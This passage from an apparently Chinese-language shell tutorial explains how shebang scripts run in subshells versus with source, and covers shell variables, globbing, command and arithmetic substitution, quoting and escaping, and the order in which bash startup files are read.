<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> +x script.sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./script.sh</span></span><br></pre></td></tr></table></figure>

<p>Shell 会<code>fork</code>一个子进程并调用<code>exec</code>执行<code>./script.sh</code>这个程序，<code>exec</code>系统调用应该把子进程的代码段替换成<code>./script.sh</code>程序的代码段，并从它的<code>_start</code>开始执行。然后<code>script.sh</code>是个文本文件，根本没有代码段和<code>_start</code>函数，怎么办呢？其实<code>exec</code>还有另外一种机制，如果要执行的是一个文本文件，并且第一行用Shebang指定了解释器，则用解释器程序的代码段替换当前进程，并且从解释器的<code>_start</code>开始执行，而这个文本文件被当作命令参数传给解释器，因此，执行上述脚本相当于执行程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">/bin/sh ./script.sh</span></span><br></pre></td></tr></table></figure>

<p>以这种方式执行不需要<code>script.sh</code>文件具有可执行权限。再举个例子，比如某个<code>sed</code>脚本的文件名是<code>script</code>，它的开头是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sed -f</span></span><br></pre></td></tr></table></figure>

<p>执行<code>./script</code>相当于执行程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">/bin/sed -f ./script.sh</span></span><br></pre></td></tr></table></figure>

<p>以上介绍了两种执行Shell脚本的方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./script.sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh ./script.sh</span></span><br></pre></td></tr></table></figure>

<p>这两种方法本质上是一样的，执行上述脚本的步骤为：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230418232642839.png" alt="image-20230418232642839"></p>
<ol>
<li>交互式Shell（bash）<code>fork/exec</code>一个子Shell（sh）用于执行脚本，父进程<code>bash</code>等待子进程<code>sh</code>终止。</li>
<li><code>sh</code>读取脚本中的<code>cd ..</code>命令，调用相应的函数执行内建命令，改变当前工作目录为上一级目录。</li>
<li><code>sh</code>读取脚本中的<code>ls</code>命令，<code>fork/exec</code>这个程序，列出当前工作目录下的文件，<code>sh</code>等待<code>ls</code>终止。</li>
<li><code>ls</code>终止后，<code>sh</code>继续执行，读到脚本文件末尾，<code>sh</code>终止。</li>
<li><code>sh</code>终止后，<code>bash</code>继续执行，打印提示符等待用户输入。</li>
</ol>
<p>如果将命令行输入的命令用（）括号括起来，那么也会<code>fork</code>出一个子Shell执行小括号中的命令，一行中可以输入由分号<code>;</code>隔开的多个命令，比如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~/Desktop$ </span><span class="language-bash">(<span class="built_in">cd</span> ..;<span class="built_in">ls</span>)</span></span><br><span class="line">Desktop    Downloads  ghidra_scripts  Pictures  Public     tmp    Videos</span><br><span class="line">Documents  firmware   Music           Projects  Templates  tools</span><br><span class="line"><span class="meta prompt_">~/Desktop$ </span></span><br></pre></td></tr></table></figure>

<p>和上面两种方法执行Shell脚本的效果是相同的，<code>cd ..</code>命令改变的是子Shell的<code>PWD</code>，而不会影响到交互式Shell。</p>
<p>如果将上述命令去掉括号后执行，则有不同的效果，<code>cd ..</code>命令是直接在交互式Shell下执行的，改变交互式Shell的<code>PWD</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~/Desktop$ </span><span class="language-bash"><span class="built_in">cd</span> ..;<span class="built_in">ls</span></span></span><br><span class="line">Desktop    Downloads  ghidra_scripts  Pictures  Public     tmp    Videos</span><br><span class="line">Documents  firmware   Music           Projects  Templates  tools</span><br><span class="line"><span class="meta prompt_">~$ </span></span><br></pre></td></tr></table></figure>

<p>然而这种方式相当于这样执行Shell脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">source</span> ./script.sh</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">. ./script.sh</span></span><br></pre></td></tr></table></figure>

<p><code>source</code>或者<code>.</code>命令是Shell的内建命令，这种方式也不会创建子Shell，而是直接在交互式Shell下逐行执行脚本中的命令。</p>
<p><a name="shebang">[2]</a>：”Shebang”这个术语的起源并不十分明确，但据说它可能来自于Unix历史上的一个命令行工具，叫做”shell bang”（或者”sh-bang”）。在早期的Unix系统中，”!”被称为”bang”，而”shell”则是指命令解释器。因此，”shell bang”可以解释为”命令解释器的bang”，也就是”shebang”。</p>
<p>另外一种说法是，”shebang”这个术语可能来自于”sharp”（井号）和”bang”（感叹号）两个符号的组合。在Unix系统中，”#”是注释的起始符号，而”!”是”bang”的符号。因此，”#!”可以理解为”sharp-bang”，也就是”shebang”。</p>
<p>无论是哪种说法，”shebang”都成为了Unix系统中指定脚本解释器的标准方式，并且在现代的Unix和类Unix系统中被广泛使用。</p>
<h2 id="3-Shell-的基本语法"><a href="#3-Shell-的基本语法" class="headerlink" title="3. Shell 的基本语法"></a>3. Shell 的基本语法</h2><h3 id="3-1-变量"><a href="#3-1-变量" class="headerlink" title="3.1 变量"></a>3.1 变量</h3><p>按照惯例，<strong>Shell 变量</strong>由<strong>全大写字母加下划线</strong>组成，有两种类型的Shell变量：<strong>环境变量</strong>和<strong>本地变量</strong>。</p>
<ul>
<li><p><strong>环境变量</strong></p>
<p>详见《进程基础知识》中的环境变量部分，环境变量可以从父进程传给子进程，因此Shell进程的环境变量可以从当前Shell传递给<code>fork</code>出来的子进程。使用<code>printenv</code>命令可以显示当前Shell进程的环境变量。</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">printenv</span></span></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">SESSION_MANAGER=local/ubuntu:@/tmp/.ICE-unix/2167,unix/ubuntu:/tmp/.ICE-unix/2167</span><br><span class="line">QT_ACCESSIBILITY=1</span><br><span class="line">COLORTERM=truecolor</span><br><span class="line">XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg</span><br><span class="line">XDG_MENU_PREFIX=gnome-</span><br><span class="line">GNOME_DESKTOP_SESSION_ID=this-is-deprecated</span><br><span class="line">GTK_IM_MODULE=fcitx</span><br><span class="line">LANGUAGE=zh_CN:en_US:en</span><br><span class="line">QT4_IM_MODULE=fcitx</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>本地变量</strong></p>
<p>只存在于当前的Shell进程，用<code>set</code>命令可以显示当前Shell进程中定义的所有变量（包括本地变量和环境变量）和函数。</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">set</span></span></span><br><span class="line">BASH=/bin/bash</span><br><span class="line">BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extglob:extquote:force_fignore:globasciiranges:histappend:interactive_comments:login_shell:progcomp:promptvars:sourcepath</span><br><span class="line">BASH_ALIASES=()</span><br><span class="line">BASH_ARGC=([0]=&quot;0&quot;)</span><br><span class="line">BASH_ARGV=()</span><br><span class="line">BASH_CMDS=()</span><br><span class="line">···</span><br><span class="line">snap_bin_path=/snap/bin</span><br><span class="line">snap_xdg_path=/var/lib/snapd/desktop</span><br><span class="line">__expand_tilde_by_ref ()</span><br><span class="line">&#123;</span><br><span class="line">    if [[ $&#123;!1&#125; == \~* ]]; then</span><br><span class="line">        eval $1=$(printf ~%q &quot;$&#123;!1#\~&#125;&quot;);</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<p>环境变量是任何进程都有的概念，而<u>本地变量是Shell独有的概念</u>。在Shell中，环境变量和本地变量的定义和用法相似。在Shell中定义或赋值一个变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">VARNAME=value</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>等号 &#x3D; 两边都不能有空格，否则会被Shell解释成命令和命令行参数。</p>
<p>一个变量定义后仅存在于当前的Shell进程，它是本地变量。用<code>export</code>命令可以把本地变量导出为环境变量，定义和导出环境变量通常可以一步完成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">export</span> VARNAME=value</span></span><br></pre></td></tr></table></figure>

<p>也可以分两步：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">VARNAME=value</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">export</span> VARNAME</span></span><br></pre></td></tr></table></figure>

<p>使用<code>unset</code>命令可以删除已定义的环境变量或本地变量。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">unset</span> VARNAME</span></span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是：</strong>在定义变量时，在变量名前不用加<code>$</code>，取变量值时要在变量名前加<code>$</code>。与C语言不同，Shell 变量不需要明确声明变量类型，实际上，Shell 变量的值都是<strong>字符串</strong>，比如我们定义<code>VAR=123</code>，其实<code>VAR</code>的值是字符串<code>123</code>而非整数。同时，Shell 变量不需要先定义后使用，如果对一个没有定义的变量取值，则值为空字符串。</p>
<p><strong>$VARNAME与${VARNAME}的区别：</strong></p>
<p>如果一个变量名为<code>VARNAME</code>，用<code>$&#123;VARNAME&#125;</code>可以表示它的值，在不引起歧义的情况下，也可以用<code>$VARNAME</code>表示它的值。在shell中，<code>$VARNAME</code>和<code>$&#123;VARNAME&#125;</code>都是用来引用变量的方式，但在一些情况下，他们的方式会有些不同。</p>
<ul>
<li><p><code>$VARNAME</code>是一种简单直接的变量引用方式，它用于直接替换变量的值。例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>$&#123;VARNAME&#125;</code>是一种更加复杂的变量引用方式，它可以用于对变量进行一些处理。例如，可以在变量名后加上一些字符串来得到一个新的字符串。<code>&#123;&#125;</code>可以明确变量名的范围，避免变量名与其他字符相连时产生歧义。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$&#123;SHELL&#125;</span></span></span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$&#123;SHELL&#125;</span>abc</span></span><br><span class="line">/bin/bashabc</span><br></pre></td></tr></table></figure></li>
</ul>
<p>以下例子展示了这两种表示法的不同：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span></span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$SHELLabc</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$SHELL</span> abc</span></span><br><span class="line">/bin/bash abc</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$&#123;SHELL&#125;</span>abc</span></span><br><span class="line">/bin/bashabc</span><br></pre></td></tr></table></figure>



<h3 id="3-2-文件名代换（Globbing）"><a href="#3-2-文件名代换（Globbing）" class="headerlink" title="3.2 文件名代换（Globbing）"></a>3.2 文件名代换（Globbing）</h3><p>Globbing 是一种通配符扩展机制，它是 Unix&#x2F;Linux 系统中的一种特性，用于匹配文件名或路径名中的通配符。通配符是一种模式匹配语法，用于匹配一个或多个字符，以便查找符合指定模式的文件或路径名。</p>
<p>常见的通配符包括以下三种：</p>
<table>
<thead>
<tr>
<th>通配符</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>匹配 0 个或多个任意字符</td>
</tr>
<tr>
<td>？</td>
<td>匹配 1 个任意字符</td>
</tr>
<tr>
<td>[···]</td>
<td>匹配方括号中任意一个字符的一次出现</td>
</tr>
</tbody></table>
<p>举个栗子：假设当前目录下有三个文件，文件目录树如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">tree .</span></span><br><span class="line">.</span><br><span class="line">├── file1.txt</span><br><span class="line">├── file2.txt</span><br><span class="line">└── file3.log</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure>

<ul>
<li><p>使用<code>*</code>匹配任意字符或字符组合</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">ls</span> *.txt</span></span><br><span class="line">file1.txt  file2.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>?</code>匹配任意单个字符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">ls</span> file?.txt</span></span><br><span class="line">file1.txt  file2.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>[]</code>匹配方括号中的任意一个字符或字符范围：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">ls</span> file[23].*</span></span><br><span class="line">file2.txt  file3.log</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>注意：</strong>Globbing所匹配的文件名是由Shell展开的，也就是说在参数还没传给程序之前就已经展开了，比如上述例子中的<code>ls file?.txt</code>命令，实际上传给<code>ls</code>命令的参数是 file1.txt 和 file2.txt 这两个文件名，而不是一个匹配字符串。</p>
<h3 id="3-3-命令代换"><a href="#3-3-命令代换" class="headerlink" title="3.3 命令代换"></a>3.3 命令代换</h3><p>在Shell脚本中，命令代换是一种将命令的输出作为参数传递给其他命令或者变量的方法。</p>
<p>命令代换的语法有两种：<code>$()</code>或者（&#96;）</p>
<ul>
<li><p>使用反引号（&#96;）的语法举例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">DATE=`<span class="built_in">date</span>`</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$DATE</span></span></span><br><span class="line">Wed 19 Apr 2023 03:37:49 PM CST</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>$()</code>的语法举例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">DATE=$(<span class="built_in">date</span>)</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$DATE</span></span></span><br><span class="line">Wed 19 Apr 2023 03:39:09 PM CST</span><br></pre></td></tr></table></figure></li>
</ul>
<p>需要注意的是：命令代换会将命令的输出作为一个字符串处理，因此对于一些需求需要进行适当的转换和处理。此外，<code>$()</code>和反引号（`）的使用是等价的，但是为了可读性和已于维护，推荐使用<code>$()</code>进行命令代换。</p>
<h3 id="3-4-算术代换"><a href="#3-4-算术代换" class="headerlink" title="3.4 算术代换"></a>3.4 算术代换</h3><p>在Shell 脚本中，算术代换是一种将算术表达式的结果作为参数传递给其他命令或者变量的方法。</p>
<p>算术代换的语法使用<code>$(())</code>，<code>$(())</code>中的Shell变量取值将转换成整数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">result=$((expression))</span><br></pre></td></tr></table></figure>

<p>其中，”expression” 是要计算的算数表达式，计算结果会被赋值给 “result” 变量。</p>
<p>举个栗子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">VAR=45</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">result=$((<span class="variable">$VAR</span>+<span class="number">3</span>))</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$result</span></span></span><br><span class="line">48</span><br></pre></td></tr></table></figure>

<p>除了加法运算外，算数代换还支持减法、乘法、除法、求余等基本的算术运算，以及逻辑运算，位运算等高级运算。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">求商和余数</span></span><br><span class="line">div=$((10 / 3))      # 商为3</span><br><span class="line">mod=$((10 % 3))      # 余数为1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">逻辑运算</span></span><br><span class="line">result=$((5 &gt; 3))    # 结果为1，即真</span><br><span class="line">result=$((5 == 3))   # 结果为0，即假</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">位运算</span></span><br><span class="line">result=$((5 &amp; 3))    # 结果为1，即二进制101和二进制011的按位与运算结果为001</span><br><span class="line">result=$((5 | 3))    # 结果为7，即二进制101和二进制011的按位或运算结果为111</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是：</strong>算数代换只能用于整数运算，不能用于浮点数运算。如果要进行浮点数运算，需要使用其他工具或者编程语言实现。</p>
<h3 id="3-5-转移字符"><a href="#3-5-转移字符" class="headerlink" title="3.5 转移字符 \"></a>3.5 转移字符 \</h3><p>和C语言类似，在Shell 脚本中，<code>\</code>被用作转义字符，用于将特殊字符转义为普通字符（回车除外），换句话说，紧跟其后的字符取字面值。</p>
<p>举个栗子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$SHELL</span></span></span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> \<span class="variable">$SHELL</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> \\</span></span><br><span class="line"><span class="language-bash">\</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>转义字符只对其后面的一个字符生效，如果要转义多个字符，需要使用多个转义字符。</p>
<p>比如创建一个文件名为 “$ $” 的文件可以这样：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">touch</span> \$\ \$</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">ls</span> -al</span> </span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 19:09 &#x27;$ $&#x27;</span><br></pre></td></tr></table></figure>

<p>还有一个字符虽然不具备特殊含义，但是要用它做文件名也很麻烦，这个字符就是<code>-</code>号。如果要创建一个以<code>-</code>开头的文件，这样是不行的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">touch</span> -file</span></span><br><span class="line">touch: 不适用的选项 -- i</span><br><span class="line">请尝试执行 &quot;touch --help&quot; 来获取更多信息。</span><br></pre></td></tr></table></figure>

<p>我们即使加上<code>\</code>转义也还是会报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">touch</span> \-file</span></span><br><span class="line">touch: 不适用的选项 -- i</span><br><span class="line">请尝试执行 &quot;touch --help&quot; 来获取更多信息。</span><br></pre></td></tr></table></figure>

<p>这是因为各种UNIX命令都会把<code>-</code>号开头的命令行参数当作命令的选项，而不会当作文件名。</p>
<p>如果我们非要处理以-号开头的文件名，有如下两种办法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">touch</span> ./-file</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">touch</span> -- -file</span></span><br></pre></td></tr></table></figure>



<p><code>\</code>还有一种用法，在<code>\</code>后边敲回车表示续行，Shell并不会立即执行命令，而是把光标移到下一行，给出一个续行提示符<code>&gt;</code>，等待用户的继续输入，最后把所有的续行接到一起当作一个命令执行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">ls</span> \</span></span><br><span class="line"><span class="language-bash">&gt; -l</span></span><br><span class="line">总用量 0</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 19:09 &#x27;$ $&#x27;</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 15:15  file1.txt</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 15:15  file2.txt</span><br><span class="line">-rw-rw-r-- 1 guoxb guoxb 0 Apr 19 15:15  file3.log</span><br></pre></td></tr></table></figure>



<h3 id="3-6-单引号"><a href="#3-6-单引号" class="headerlink" title="3.6 单引号"></a>3.6 单引号</h3><p>和C语言不同，Shell 脚本中的单引号和双引号一样都是字符串的界定符。</p>
<p>单引号(<code>&#39;</code>)用于定义一个单引号字符串，即一个<strong>不</strong>支持变量替换和命令替换的字符串。</p>
<p>单引号字符串中的所有特殊字符都会被视为普通字符，换句话说就是，单引号用于保持引号内所有字符的字面值，即使引号内的<code>\</code>和回车也不例外，但是字符串中不能出现单引号。如果引号没有配对就输入回车，Shell 会给出续行提示符<code>&gt;</code>，要求用户把引号配上对。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;$SHELL&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;ABC\</span></span></span><br><span class="line"><span class="string"><span class="language-bash">&gt;DE</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="string">&#x27;</span></span></span><br><span class="line">ABC\</span><br><span class="line">DE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;ABC\（回车）</span></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="string">DE&#x27;</span></span></span><br><span class="line">ABC\</span><br><span class="line">DE</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是：</strong>单引号字符串只适用于纯文本字符串，并且在单引号字符串里无法插入单引号本身，如果需要插入单引号或者需要进行变量替换或者命令替换，则需要使用双引号字符串。</p>
<h3 id="3-7-双引号"><a href="#3-7-双引号" class="headerlink" title="3.7 双引号"></a>3.7 双引号</h3><p>在Shell 脚本中，双引号（<code>&quot;</code>）用于定义一个双引号字符串，即一个支持变量替换和命令替换的字符串。</p>
<p>双引号用于保持引号内所有字符的字面值（包括回车），但是以下情况除外：</p>
<ul>
<li><code>$</code>加变量名可以取变量的值</li>
<li><code>$()</code>和(&#96;)可以表示命令替换</li>
<li><code>\$</code>表示<code>$</code>的字面值</li>
<li><code>\</code>+反引号表示&#96;&#96; &#96;的字面值</li>
<li><code>\&quot;</code>表示<code>&quot;</code>的字面值</li>
<li><code>\\</code>表示<code>\</code>的字面值</li>
</ul>
<p>除了上述情况之外，在其他字符前面的<code>\</code>无特殊含义，只表示字面值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$SHELL</span>&quot;</span></span></span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date)</span>&quot;</span></span></span><br><span class="line">Wed 19 Apr 2023 08:19:42 PM CST</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;I&#x27;d say: \&quot;GO for it\&quot;&quot;</span></span></span><br><span class="line">I&#x27;d say: &quot;GO for it&quot;</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;\&quot;</span></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash"><span class="string">new line&quot;</span></span></span><br><span class="line">&quot;</span><br><span class="line">new line</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;\\&quot;</span></span></span><br><span class="line">\</span><br></pre></td></tr></table></figure>



<h2 id="4-bash-启动脚本"><a href="#4-bash-启动脚本" class="headerlink" title="4. bash 启动脚本"></a>4. bash 启动脚本</h2><p>启动脚本（startup script）是<code>bash</code>启动时自动执行的脚本文件。这些脚本文件通常包含了一些用户自定义的配置、别名、环境变量等信息，以便在每次打开终端时都能够自动加载这些信息，从而减少了手动设置的工作量。</p>
<p>用户可以把一些环境变量的设置和<code>alias</code><a href="#alias">[3]</a>、<code>umask</code><a href="#umask">[4]</a>设置放在启动脚本中，这样每次启动Shell时这些设置都会自动生效。思考一下，<code>bash</code>在执行启动脚本时是以<code>fork</code>子Shell方式执行还是以<code>source</code>方式执行的？（答：<code>source</code> 方式）</p>
<p>Bash启动脚本分为全局和局部两种。全局启动脚本的文件名通常是以<code>/etc</code>目录下的<code>bash.bashrc</code>或<code>bashrc</code>文件为名，而局部启动脚本的文件名通常是以用户主目录下的<code>.bashrc</code>文件为名。具体来说：</p>
<ul>
<li><code>/etc/bash.bashrc</code>：全局启动脚本，适用于所有用户。在Bash shell启动时，会自动执行该文件中的所有命令。</li>
<li><code>/etc/bashrc</code>：全局启动脚本，适用于所有用户。在Bash shell启动时，会自动执行该文件中的所有命令。</li>
<li><code>/etc/profile</code>：全局启动脚本，适用于所有用户。在用户登录Shell会读取并执行<code>/etc/profile</code>文件中的命令和设置，以便在每次登录时自动加载一些系统级别的配置、别名、环境变量等信息。</li>
<li><code>~/.bashrc</code>：局部启动脚本，适用于当前用户。在Bash shell启动时，会自动执行该文件中的所有命令。</li>
<li><code>~/.bash_profile</code>：局部启动脚本，适用于当前用户。在用户登录时，会自动执行该文件中的所有命令。通常在该文件中设置一些用户自定义的环境变量和别名等信息。</li>
<li><code>~/.bash_login</code>：局部启动脚本，适用于当前用户。在用户登录时，如果不存在<code>~/.bash_profile</code>文件，则会自动执行该文件中的所有命令。</li>
<li><code>~/.profile</code>：局部启动脚本，适用于当前用户。在用户登录时，如果不存在<code>~/.bash_profile</code>和<code>~/.bash_login</code>文件，则会自动执行该文件中的所有命令。</li>
</ul>
<p>需要注意的是，不同的Linux&#x2F;Unix发行版可能有不同的Bash启动脚本文件命名和路径，具体的命名和路径可以查看相应的文档或手册。</p>
<p>启动<code>bash</code>的方法不同，执行启动脚本的步骤也不相同，具体可分为以下几个情况。</p>
<h3 id="4-1-作为交互登录-Shell-启动，或者使用-–login-参数启动"><a href="#4-1-作为交互登录-Shell-启动，或者使用-–login-参数启动" class="headerlink" title="4.1 作为交互登录 Shell 启动，或者使用 –login 参数启动"></a>4.1 作为交互登录 Shell 启动，或者使用 –login 参数启动</h3><p>交互Shell 是指用户在提示符下输命令的 Shel l而非执行脚本的 Shell ，登录Shell 就是在输入用户名和密码登录后得到的 Shell ，比如从字符终端登录或者用<code>telnet/ssh</code>从远程登录，但是从图形界面的窗口管理器登录之后会显示桌面而不会产生登录Shell（也就不会执行启动脚本），在图像界面下打开终端窗口得到的 Shell 也不是登录Shell。</p>
<p>这样启动<code>bash</code>会自动执行以下脚本：</p>
<ol>
<li>首先执行<code>/etc/profile</code>，系统中每个用户登录时都要执行这个脚本。如果系统管理员希望某个设置对所有用户都生效，可以写在这个脚本里。</li>
<li>然后依次查找当前用户主目录的<code>/.bash_profile</code>、<code>/.bash_login</code>、<code>/.profile</code>三个文件，找到第一个存在并且可读的文件来执行，如果希望某个设置只对当前用户生效，可以写到这个脚本里。由于这个脚本在<code>/etc/profile</code>之后执行，<code>/etc/profile</code>设置的一些环境变量的值在这个脚本中可以修改，也就是说，当前用户的设置可以覆盖（Override）系统中全局的设置。<code>/.profile</code>这个启动脚本是<code>sh</code>规定的，<code>bash</code>规定首先查找以<code>/.bash_</code>开头的启动脚本，如果没有则执行<code>/.profile</code>，是为了和<code>sh</code>保持一致。</li>
<li>顺便一提，在退出登录时，会执行<code>/.bash_logout</code>脚本（如果它存在的话）</li>
</ol>
<h3 id="4-2-以交互非登录Shell启动"><a href="#4-2-以交互非登录Shell启动" class="headerlink" title="4.2 以交互非登录Shell启动"></a>4.2 以交互非登录Shell启动</h3><p>比如在图形界面下开一个终端窗口，或者在登录Shell提示符下再输入<code>bash</code>命令，就可以得到一个交互非登录的Shell ，这种 Shell 在启动时自动执行<code>/.bashrc</code>脚本。</p>
